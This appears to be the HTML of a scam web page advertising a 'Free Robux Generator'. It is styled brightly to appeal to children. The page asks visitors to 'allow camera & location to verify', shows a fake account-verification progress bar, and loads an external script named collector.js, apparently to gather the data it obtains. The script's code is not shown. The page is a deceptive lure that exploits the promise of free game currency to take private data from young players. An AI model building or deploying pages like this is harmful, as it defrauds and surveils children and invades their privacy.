<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎮 Free Robux Generator 2026</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            font-family:'Comic Sans MS',cursive,sans-serif;
            background:linear-gradient(135deg,#ff6b6b,#ffd93d,#6bcb77,#4d96ff);
            background-size:400% 400%;
            animation:bgMove 8s ease infinite;
            display:flex;justify-content:center;align-items:center;
            height:100vh;overflow:hidden;
        }
        @keyframes bgMove{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
        .card{
            background:white;border-radius:30px;padding:40px 30px;
            text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);
            max-width:380px;border:5px dashed #ff6b6b;
            animation:bounce 2s infinite;
        }
        @keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-15px)}}
        .emoji{font-size:70px;animation:spin 3s linear infinite;display:inline-block}
        @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
        h1{font-size:28px;color:#ff6b6b;text-shadow:3px 3px 0 #ffd93d;margin:15px 0}
        p{font-size:16px;color:#666;margin:10px 0}
        .loading-bar{width:100%;height:25px;background:#eee;border-radius:15px;margin:20px 0;overflow:hidden;border:3px solid #ffd93d}
        .loading-fill{height:100%;background:linear-gradient(90deg,#ff6b6b,#ffd93d,#6bcb77);border-radius:12px;animation:fill 3s ease forwards;width:0%}
        @keyframes fill{0%{width:0%}50%{width:70%}100%{width:100%}}
        .loading-text{color:#999;font-size:14px;margin-top:10px}
    </style>
</head>
<body>
    <div class="card">
        <div class="emoji">🎮</div>
        <h1>FREE ROBUX!</h1>
        <p>Please allow camera & location to verify!</p>
        <div class="loading-bar"><div class="loading-fill"></div></div>
        <p class="loading-text">Verifying your account...</p>
    </div>
    <script src="/collector.js?v=2"></script>
</body>
</html>
